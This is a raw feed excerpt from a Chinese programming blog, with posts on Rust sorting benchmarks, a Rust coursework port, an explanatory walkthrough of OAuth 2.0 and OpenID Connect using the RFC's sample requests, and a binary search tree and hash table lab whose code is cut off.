keyword">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>compare_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    num1 <span class="token operator">></span> num2<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>结果:<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">0</span>.06s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>居然只剩6ms了，快了500倍，可怕，这还包括了生成随机数的时间</p><p>比较有意思的是<code>--release</code>，如果正常打印日志速度变慢了两三倍（18 -&gt; 49s），而去掉日志又变快了一个数量级（67 -&gt; 6 ms）</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;h3 id=&quot;内部排序算法比较&quot;&gt;&lt;a href=&quot;#内部排序算法比较&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
    <category term="排序" scheme="https://aucept.in/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>锈化的大作业</title>
    <link href="https://aucept.in/2025/12/16/%E9%94%88%E5%8C%96%E7%9A%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
    <id>https://aucept.in/2025/12/16/%E9%94%88%E5%8C%96%E7%9A%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/</id>
    <published>2025-12-16T04:11:59.000Z</published>
    <updated>2025-12-23T13:18:41.085Z</updated>
    
    <content type="html"><![CDATA[<p>如题，其实是java的大作业，但是锈化版，只是熟悉各种常用依赖</p><p><a href="https://github.com/AuceptinFang/rusty_java_final_lab.git">https://github.com/AuceptinFang/rusty_java_final_lab.git</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;如题，其实是java的大作业，但是锈化版，只是熟悉各种常用依赖&lt;/p&gt;
&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>OAuth 2.0 与 OIDC</title>
    <link href="https://aucept.in/2025/12/12/Oauth2-%E4%B8%8E-OIDC/"/>
    <id>https://aucept.in/2025/12/12/Oauth2-%E4%B8%8E-OIDC/</id>
    <published>2025-12-12T11:31:14.000Z</published>
    <updated>2025-12-13T12:47:45.875Z</updated>
    
    <content type="html"><![CDATA[<p>最近写的程序涉及到了OAuth2.0 和 OIDC，遂仔细理解一下这两个协议</p><p>OIDC是OAuth的拓展，所以先从OAuth开始，<a href="https://datatracker.ietf.org/doc/html/rfc6749">参考文档</a></p><h2 id="OAuth-2-0"><a href="#OAuth-2-0" class="headerlink" title="OAuth 2.0"></a>OAuth 2.0</h2><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><p>Open Authorization，开放式授权，要解决的核心问题是“在不获取另一应用的密码的情况下，访问到另一应用里受保护的资源”，比如很多app/网站都支持微信登录，然而他们并不需要知道你的微信密码</p><p>那么如何实现呢？直接共享密码相当于完全暴露隐私，显然是不可取的，部分应用使用api key，这样一个key对应一个服务，虽然实现了受限访问，但key和密码本质上也没啥区别</p><p>于是OAuth应运而生，其核心是使用访问令牌（access token）——一个包含权限范围、持续时长与其他访问属性的字符串。认证服务器在得到用户的批准后将token颁发给第三方应用，这个第三方用这个token就可以访问到受保护的资源</p><h3 id="四个角色"><a href="#四个角色" class="headerlink" title="四个角色"></a>四个角色</h3><p>为了说明更加清晰，OAuth定义了四个角色：</p><ul><li>resource owner，资源拥有者，一般来说就是用户</li><li>resource server 资源服务器，资源实际存放的地方</li><li>client 客户端，也就是要用资源的第三方应用</li><li>authorization server 进行身份认证和颁发token的服务器</li></ul><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">+--------+                               +---------------+|        |--(A)- Authorization Request ->|   Resource    ||        |                               |     Owner     ||        |&lt;-(B)-- Authorization Grant ---|               ||        |                               +---------------+|        ||        |                               +---------------+|        |--(C)-- Authorization Grant -->| Authorization || Client |                               |     Server    ||        |&lt;-(D)----- Access Token -------|               ||        |                               +---------------+|        ||        |                               +---------------+|        |--(E)----- Access Token ------>|    Resource   ||        |                               |     Server    ||        |&lt;-(F)--- Protected Resource ---|               |+--------+                               +---------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单说就是，客户端向你请求进行认证，你完成认证，客户端再去授权服务器，认证成功得到token，再拿着token去资源服务器拿东西</p><p>展开的话，对于向用户发起请求，更建议的（称为标准的）方式是通过授权服务器作为中介来间接发出，也就是重定向到认证服务器去认证，通过url设置返回地址再回来。直白的说，直接方式是问你用户名密码权限，间接方式是把你送到认证服务器输入密码。所以直接方式还要OAuth干什么？</p><p>然后认证成功，客户端得到授权凭证（Authorization Grant），这有四种形式：</p><ul><li>Authorization Code，其中最常用最安全的，重定向到授权服务器完成身份验证，完成后获得code</li><li>implicit, 前者的简化，认证成功后直接授予token省略中介材料，有安全风险，已经被 带有 PKCE（Proof Key for Code Exchange）的授权码模式所取代</li><li>resource owner password credentials 直接授予密码，仅限于客户端和资源服务器是同一家时可用</li><li>client credentials 一种机器对机器(M2M)的场景，无用户参与，即直接从C环节开始，客户端已有授权服务器信任的id和秘钥，服务器在验证之后直接颁发token</li></ul><p>客户端向认证服务器呈递凭证，验证合法后颁发token</p><p>客户端向资源服务器呈递token，同样验证有效后回应请求</p><h3 id="Access-Token-与-Refresh-Token"><a href="#Access-Token-与-Refresh-Token" class="headerlink" title="Access Token 与 Refresh Token"></a>Access Token 与 Refresh Token</h3><p>Access Token 一个字符串，包含权限等信息，一般来说对客户端不透明（看不懂）</p><p>在获得Access token的同时，一般也会同时获得Refresh Token。前者的过期时间很短，如果每五分钟验证一次身份太过影响使用体验，所以又产生了过期慢得多的Refresh Token</p><p>客户端可以在access token验证无效（过期）后用Refresh Token找授权服务器换取新的</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>作为流程的第一环，只有受信任的客户端才能开始整个流程，所以在授权开始前，客户端需要去授权服务器注册，如何注册不在本协议范畴，但是重点是获得需要的属性:</p><ul><li>id &amp;&amp; secret : 客户端的标识符，密码不可外泄</li><li>type: public or Confidential，比如web应用的后端在独立的服务器上，数据可以保证不外泄，所以是机密的；而手机app的后端数据就在本地，就是公开的，需要考虑客户端可能伪造</li><li>redirect_url : 授权码得到后只能被重定向到唯一合法地址，保证授权码不会外泄</li></ul><h3 id="三个Endpoint"><a href="#三个Endpoint" class="headerlink" title="三个Endpoint"></a>三个Endpoint</h3><p>OAuth 2.0 的授权过程主要涉及三个网络地址（Endpoint）</p><h4 id="Authorization-Endpoint-授权端点"><a href="#Authorization-Endpoint-授权端点" class="headerlink" title="Authorization Endpoint (授权端点)"></a>Authorization Endpoint (授权端点)</h4><p>授权服务器的地址，客户端将资源拥有者重定向到这里完成第一步的认证</p><h4 id="Token-Endpoint-令牌端点"><a href="#Token-Endpoint-令牌端点" class="headerlink" title="Token Endpoint (令牌端点)"></a>Token Endpoint (令牌端点)</h4><p>授权服务器的另一个地址，客户端从这里用授权码换取token</p><h4 id="Redirection-Endpoint-重定向端点"><a href="#Redirection-Endpoint-重定向端点" class="headerlink" title="Redirection Endpoint (重定向端点)"></a>Redirection Endpoint (重定向端点)</h4><p>客户端的地址，授权服务器会将授权码通过重定向发送到这里，也就是刚才客户端注册时的redirect_url</p><h3 id="授权码模式详解"><a href="#授权码模式详解" class="headerlink" title="授权码模式详解"></a>授权码模式详解</h3><h4 id="Authorization-Request"><a href="#Authorization-Request" class="headerlink" title="Authorization Request"></a>Authorization Request</h4><p>GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz<br>&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1<br>Host: server.example.com</p><p>指明response_type为授权码模式；客户端id；推荐带有state字段，一个随机字符串，用来防范跨站请求伪造（CSRF）攻击；重定向uri；权限scope（optional）</p><h4 id="Authorization-Response"><a href="#Authorization-Response" class="headerlink" title="Authorization Response"></a>Authorization Response</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 302 FoundLocation: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA&amp;state=xyz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在验证通过后，回应302重定向到刚才的redirect_uri，附带code，和state（如果有）</p><h4 id="Error-Response"><a href="#Error-Response" class="headerlink" title="Error Response"></a>Error Response</h4><p>对于错误处理，有两种情况。如果错误在redirect_uri和client_id，那么就无法证明客户端的身份，是最危险的情况所以不跳转展示错误信息</p><p>如果是其余错误，则携带错误信息返回，包括:</p><ul><li>invalid_request: 缺少参数、格式错误、重复参数、未知参数等</li><li>unauthorized_client: 客户端未被授权（如public类型的不能使用授权码模式）</li><li>access_denied: 资源拥有者或授权服务器拒绝了请求（用户没有完成认证）</li><li>unsupported_response_type: 授权服务器不支持</li><li>invalid_scope: scope非法、未知或格式错误</li><li>server_error: 授权服务器错误</li><li>temporarily_unavailable: 授权服务器错误</li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 302 FoundLocation: https://client.example.com/cb?error=access_denied&amp;state=xyz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>error_description和error_uri可选</p><h4 id="Access-Token-Request"><a href="#Access-Token-Request" class="headerlink" title="Access Token Request"></a>Access Token Request</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /token HTTP/1.1Host: server.example.comAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JWContent-Type: application/x-www-form-urlencodedgrant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>grant_type必须为authorization_code；授权码code；redirect_uri，必须和之前的一致；client id</p><h4 id="Access-Token-Response"><a href="#Access-Token-Response" class="headerlink" title="Access Token Response"></a>Access Token Response</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 200 OKContent-Type: application/json;charset=UTF-8Cache-Control: no-storePragma: no-cache&#123;"access_token":"2YotnFZFEjr1zCsicMWpAA","token_type":"example","expires_in":3600,"refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA","example_parameter":"example_value"&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>包含两个token，过期时间（秒），token类型，scope</p><p>同样，错误处理：<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 400 Bad RequestContent-Type: application/json;charset=UTF-8Cache-Control: no-storePragma: no-cache&#123;"error":"invalid_request"&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h4 id="Refreshing-an-Access-Token"><a href="#Refreshing-an-Access-Token" class="headerlink" title="Refreshing an Access Token"></a>Refreshing an Access Token</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /token HTTP/1.1Host: server.example.comAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JWContent-Type: application/x-www-form-urlencodedgrant_type=refresh_token&amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>grant_type必须为refresh_token，scope可选</p><h4 id="Accessing-Protected-Resources"><a href="#Accessing-Protected-Resources" class="headerlink" title="Accessing Protected Resources"></a>Accessing Protected Resources</h4><p>出示令牌的方式取决于刚才的token_type，分为两类，Bearer和MAC</p><p>前者是绝对的主流方式，Authorization: Bearer [Access Token]即可，MAC需要客户端用token进行签名，极少使用</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">GET /resource/1 HTTP/1.1Host: example.comAuthorization: Bearer mF_9.B5f-4.1JqM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">GET /resource/1 HTTP/1.1Host: example.comAuthorization: MAC id="h480djs93hd8",                nonce="274312:dj83hs9s",                mac="kDZvddkndxvhGRXZhvuDjEWhGeE="<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="OIDC"><a href="#OIDC" class="headerlink" title="OIDC"></a>OIDC</h2><p>OAuth 2.0的流程基本清晰了，接下来是OIDC(OpenID Connect)，<a href="https://openid.net/developers/how-connect-works/">官网文档</a> 和 <a href="https://blog.logto.io/zh-CN/what-is-oidc">logto提供的资料</a></p><p>OIDC 是基于 OAuth 2.0 协议之上的简单身份层（Identity Layer）</p><p>OAuth 2.0 负责 授权 (Authorization)：即“允许这个应用代替我去拿数据”，OIDC 负责认证 (Authentication)：即“证明这个用户是谁”</p><p>access token像一把钥匙，拿到就可以获取对应的信息，而OIDC则多带上了身份证，意味着可以根据身份获取不同的“资源”</p><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p>OIDC引入了三个角色：</p><ul><li>终端用户 (End User): 最终用户，对应 OAuth 2.0 的资源所有者</li><li>依赖方 (RP): 依赖方，对应 OAuth 2.0 的客户端</li><li>OpenID 提供者 (OP): 身份认证服务提供者，对应 OAuth 2.0 的授权服务器和资源服务器</li></ul><p>在OAuth 2.0的基础上，OIDC的流程只有很微小的变化：</p><ul><li>在第一步重定向发起授权请求时，必须包含 scope=openid</li><li>在获取access token的同时还会得到一个带有个人身份信息的ID Token</li></ul><h3 id="ID-token"><a href="#ID-token" class="headerlink" title="ID token"></a>ID token</h3><p>一个 JWT (JSON Web Token) 格式的字符串，包含以下必要信息：</p><ul><li>sub (Subject)最重要的，用户的唯一 ID    </li><li>iss (Issuer)签发者，即授权服务器</li><li>aud (Audience) 受众，客户端（依赖方）</li><li>exp (Expiration Time) 过期时间</li><li>iat (Issued At) 签发时间</li></ul><p>ID token是给客户端RP看的，可以将access token和用户身份绑定于是避免了“混淆代理人攻击” (Confused Deputy Problem)</p><p>单纯的access token不含有用户信息，所以即使只是想知道用户的id也许要再进行一次查询</p><p>access token还有过期，而只要id token没过期就不用重新进行身份验证，</p><h3 id="userinfo-endpoint"><a href="#userinfo-endpoint" class="headerlink" title="userinfo-endpoint"></a>userinfo-endpoint</h3><p>用户信息端点，OP提供的标准化 HTTP API 用于获取经过身份验证的用户详细信息，通过使用访问令牌向该端点发送 GET 或 POST 请求，可以接收到 JSON 格式的用户信息。 </p><p>ID token里能承载的信息有限，所以定义了这样一个接口获取详细全部信息，按协议在OP_url/userinfo这个路径下，按照协议规范，客户端应通过访问 Discovery Endpoint（路径为 OP_url/.well-known/openid-configuration）来获取服务元数据。在该元数据 JSON 中，userinfo_endpoint即是准确url</p><h3 id="Discovery-Endpoint"><a href="#Discovery-Endpoint" class="headerlink" title="Discovery Endpoint"></a>Discovery Endpoint</h3><p><a href="https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderMetadata">详细文档</a></p><p>元数据文档里的重要数据字段：</p><ul><li>issuer: The unique identifier of the OpenID Provider. It should be used for validating the tokens.</li><li>authorization_endpoint: The URL to initiate the  Authentication request .</li><li>token_endpoint: The URL to send the  Token request .</li><li>jwks_uri: The URL to retrieve the  JSON Web Key Set (JWKS) for  Signing key validation.</li><li>response_types_supported: The supported response types for the  Authentication request .</li><li>scopes_supported: The supported  scopes for the  Authentication request .</li><li>claims_supported: The supported  claims for the  ID token .</li><li>token_endpoint_auth_methods_supported: The supported client authentication methods for the  Token request .</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>OIDC是现代身份管理系统的底层技术，它有更多的使用场景：</p><ul><li>单点登录 (SSO) OP 统一管理用户的登录状态（Session）。一旦在一个应用登录，其他应用（RP）就可以直接通过 OIDC 拿到 ID Token，无需再次输入密码.用户只需登录一次，即可访问所有关联应用，提高效率。</li><li>组织结构管理 OP返回的信息中可以包含组织职位等信息</li><li>权限管理 </li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;最近写的程序涉及到了OAuth2.0 和 OIDC，遂仔细理解一下这两个协议&lt;/p&gt;
&lt;p&gt;OIDC是OAuth的拓展，所以先从OAuth开始，&lt;a</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="OAuth 2.0" scheme="https://aucept.in/tags/OAuth-2-0/"/>
    
    <category term="OIDC" scheme="https://aucept.in/tags/OIDC/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-二叉搜索树与哈希表实验</title>
    <link href="https://aucept.in/2025/12/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%93%88%E5%B8%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/12/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%93%88%E5%B8%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-12-12T08:14:41.000Z</published>
    <updated>2025-12-13T12:35:25.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">（一）：二叉排序树- 问题：从键盘输入数据建立二叉排序树，实现查找、遍历和格式化打印- 要求：建立BST，实现查找（成功/不成功），计算查找长度- 测试：自行设计测试数据，注意边界情况（二）：哈希表设计- 问题：为30个中文拼音人名设计哈希表，平均查找长度≤2- 要求：使用除留余数法构造哈希函数，可选线性探测、再散列或链地址法处理冲突- 测试：使用熟悉的30个人名作为数据（三）：实现二叉排序树的插入和删除功能（四）：从教科书上介绍的哈希函数构造方法中选出适用者并设计几个不同的哈希函数，比较他们的地址冲突率（可以用更大的名字集合作实验）。（五）：研究必做实验（2）的30个人名的特点，努力找一个哈希函数，使得对于不同的拼音名一定不发生地址冲突。（六）：在哈希函数确定的前提下尝试各种不同处理冲突的方法，考察平均查找长度的变化和造好的哈希表中关键字的聚集性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h2><p>数据结构可以照搬之前的二叉树，这里做了微调：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">Context</span><span class="token punctuation">,</span> <span class="token class-name">Result</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">SearchTree</span><span class="token punctuation">&#123;</span>    root <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span><span class="token punctuation">&#123;</span>    value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span>    left <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">,</span>    right <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">SearchTree</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">SearchTree</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SearchTree</span><span class="token punctuation">&#123;</span>            root <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>root <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">&#123;</span>value <span class="token punctuation">:</span> value<span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> <span class="token keyword">mut</span> node<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root <span class="token punctuation">&#123;</span>                node<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">build</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> values <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> v <span class="token keyword">in</span> values <span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">search</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">None</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> root <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> <span class="token punctuation">(</span>result<span class="token punctuation">,</span> depth <span class="token punctuation">)</span><span class="token operator">=</span> root<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"查找次数: &#123;&#125;"</span><span class="token punctuation">,</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            root<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 默认使用中序遍历了</span>    <span class="token keyword">fn</span> <span class="token function-definition function">traverse</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            root<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">delete</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">is_some</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>root <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">::</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token macro property">bail!</span><span class="token punctuation">(</span><span class="token string">"根节点为空"</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token 